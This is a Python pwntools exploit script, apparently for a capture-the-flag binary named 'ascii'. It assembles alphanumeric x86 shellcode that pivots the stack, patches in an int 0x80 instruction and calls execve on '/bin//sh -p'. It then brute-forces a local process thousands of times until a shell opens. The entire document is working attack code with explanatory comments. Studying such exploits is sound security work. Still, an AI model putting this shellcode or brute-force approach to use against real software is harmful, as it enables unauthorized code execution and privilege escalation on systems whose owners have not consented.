from pwn import *

# EAX = 0
# EBX = address of /bin/sh\x00
# ECX = 0x800000a0
# ESI = 0
shellcode = b"j0X40PZRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPS"
# set edx = NULL
shellcode += b"ZZ" #asm("pop edx;pop edx;") 
# stack pivot
shellcode += asm('push ecx; pop esp;')
shellcode += asm('inc esp') * 10
# set int 0x80
shellcode += asm('pop eax; dec eax; xor ax, 0x4f73; xor ax, 0x3041; push eax')
# stack pivot back to the real stack
shellcode += asm('push ebx; pop esp;')
# set ecx = ["/bin//sh", "-p", NULL]
shellcode += asm("push 0x30305050; pop eax; xor eax, 0x3030207d; push eax; push esp; pop eax;")
shellcode += asm("push esi; push eax; push ebx; push esp; pop ecx")
# set eax = 0xb (execve)
shellcode += asm('push edx; pop eax; xor al, 0x4a; xor al, 0x41;')
# jump to int 0x80
# + 10 + 6
shellcode += b"\x75\x43" # jne 0x45
print(len(shellcode))
# NOP
shellcode += asm('inc esi') * (160 - len(shellcode))
# ECX  0x800000a0 ◂— inc esi /* 0x46464646; 'FFFFFFFF4' */
# ecx points here , esp pivots here
shellcode += asm('inc esi') * 8 + b"\x34\x00"

payload = shellcode

# normally chances are 1/16 (the higher nibble changes)
# but strcpy puts a null byte in the previous byte
# now the chances are 1/256*16 = 1/4096
# payload += b"\x34" # '4' because the last nibble is 4

for _ in range(4096*2):
    io = process("./ascii")
    io.sendline(payload)
    sleep(0.15)
    exit_code = io.poll()
    if exit_code == None:
        print("exit code: ", exit_code)
        io.interactive()
    io.close()
